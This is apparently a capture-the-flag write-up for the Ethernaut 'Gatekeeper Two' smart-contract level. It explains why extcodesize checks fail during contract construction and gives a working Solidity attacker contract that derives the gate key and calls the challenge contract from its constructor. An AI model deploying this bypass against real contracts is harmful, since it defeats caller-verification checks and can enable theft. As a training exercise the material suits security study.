# Level 14 - Gatekeeper Two

- extcodesize opcode → address as input, returns code size of given address. It is used to define if an address belongs to EOA or contract. [HOWEVER, it is not safe to use](https://consensys.github.io/smart-contract-best-practices/development-recommendations/solidity-specific/extcodesize-checks/).
- A contract does not have source code during construction. For this reason, if a contract calls another contract during constructor method, it does not have a code yet.
- Rest is simple. Use below contract and attack during deployment.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperTwo {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperTwoAttacker {
    constructor() {
        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        IGatekeeperTwo(0x80c03FFbE18cA1C78B3e04906f0cCB53ccCBc14f).enter(_gateKey);   
    }
}
```